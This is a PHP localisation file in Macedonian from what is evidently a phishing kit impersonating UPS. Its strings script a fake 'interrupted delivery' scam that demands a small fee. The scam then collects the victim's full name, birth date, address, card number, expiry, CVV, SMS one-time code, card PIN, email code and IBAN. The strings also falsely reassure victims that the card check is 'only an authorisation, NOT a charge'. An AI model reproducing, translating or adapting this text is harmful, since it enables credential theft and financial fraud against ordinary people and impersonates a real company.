<?php
function lang($phrase){
	static $lang = array(

        "xlang" => "MK",
        "xcapt1" => "Проверете го полето CAPTCHA",
        "xcapt2" => "Верификација",
        "xcapt3" => "Продолжи",
        "xfot1" => "Овој сајт",
        "xfot2" => "Други UPS-локации",
        "xfot3" => "Поврзете се со нас",
        "xfot4" => "Правни",
        "xfot5" => "Авторски права ©1994-2023 United Parcel Service of America, Inc. Сите права се задржани.",
        "xind1" => "Следи",
        "xind2" => "Број за следење",
        "xind3" => "Грешка: Ве молиме наведете го точниот број за следење",
        "xind4" => "Ви треба помош за менување на испораката?",
        "xind5" => "Проценете",
        "xind6" => "Испраќање",
        "xind7" => "Наплата",
        "xind8" => "Побарајте помош",
        "xexp1" => "Испораката е прекината",
        "xexp2" => "Следете",
        "xexp3" => "Вашата последна испорака беше прекината. Таа моментално чека во центарот за сортирање",
        "xexp4" => "Пакетот испратен до вас не ја исполнува наведената тежина и ќе биде побарано да платите дополнително за да се обезбеди успешна испорака на вашиот пакет",
        "xexp5" => "Трошоците се 0,48 €",
        "xexp6" => "За да платите, ве молиме кликнете на копчето подолу",
        'xexp7' => "Плати",
        "xexp8" => "Откако ќе се плати данокот, вашиот пакет ќе биде испратен што е можно побрзо на адресата за испорака",
        "xexp9" => "Доколку данокот не се плати во рок од 48 часа, пакетот ќе му биде вратен на испраќачот",
        "xexp10" => "Следење по референтен број",
        "xexp11" => "Увезете броеви за следење",
        "xexp12" => "Други услуги за следење",
        "xinfz1" => "Потврдете ги вашите детали за наплата",
        "xinfz2" => "Целосно име",
        "xinfz10" => "Дата на раѓање",
        "xinfz3" => "Земја",
        "xinfz4" => "Градот",
        "xinfz5" => "Адреса",
        "xinfz6" => "Телефон",
        "xinfz7" => "Поштенски код",
        "xinfz8" => "Грешка: Потребни се сите податоци",
        "xinfz9" => "Потврди",
        "xpay1" => "Детали за плаќањата",
        "xpay2" => "Почитуван клиент, правилно проверете ги вашите податоци за плаќање и усогласете ги податоците за вашата картичка за да ги комплетирате",
        "xpay3" => "име на картичката",
        "xpay4" => "Број на картичка",
        "xpay5" => "Дата на истекување",
        "xpay6" => "CVV безбедносен код (3 цифри)",
        "xpay7" => "Грешка: Потребни се сите податоци",
        "xpay8" => "Потврди",
        "xsms1" => "Верификација",
        "xsms2" => "Испративме шифра за потврда на вашиот број",
        "xsms3" => "OTP код",
        "xsms4" => "Грешка: неточен otp код.",
        "xsms5" => "Овој чекор е неопходен за безбедно да го завршите процесот на плаќање",
        "xsms6" => "UPS-от врши привремена автентикација на вашата картичка за да ја потврди. Ова е само овластување и НЕ такса.",
        "xsms7" => "Потврда",
        "xconf1" => "Продолжување на испораката",
        "xconf2" => "Исплатата на дополнителни трошоци е земена во предвид",
        "xconf3" => "Вашиот пакет треба да пристигне во следните 24 часа",
        "xconf4" => "Потврди",
        "xpin1" => "Верификација",
        "xpin2" => "Внесете го пинскиот код на вашата банкарска картичка",
        "xpin3" => "PIN кодот",
        "xpin4" => "(4 цифри)",
        "xpin5" => "Овој чекор е неопходен за безбедно да го завршите процесот на плаќање",
        "xpin6" => "UPS врши привремена проверка на вашата картичка за да ја потврди. Ова е само овластување и НЕ такса.",
        "xpin7" => "Потврди",
        "xmail1" => "Верификација",
        "xmail2" => "Испративме код за потврда на вашата е-пошта",
        "xmail3" => "Код за е-пошта",
        "xmail4" => "(6 цифри)",
        "xmail5" => "Овој чекор е неопходен за безбедно да го завршите процесот на плаќање",
        "xmail6" => "UPS врши привремена проверка на вашата картичка за да ја потврди. Ова е само овластување и НЕ такса.",
        "xmail7" => "Потврди",
        "xiban1" => "Верификација",
        "xiban2" => "Ве молиме внесете го вашиот IBAN за да го завршите плаќањето",
        "xiban3" => "IBAN",
        "xiban4" => "(IBAN)",
        "xiban5" => "Овој чекор е неопходен за безбедно да го завршите процесот на плаќање",
        "xiban6" => "UPS врши привремена проверка на вашата картичка за да ја потврди. Ова е само овластување и НЕ такса.",
        "xiban7" => "Потврди"
	);	
	
	return $lang[$phrase];
}
 ?>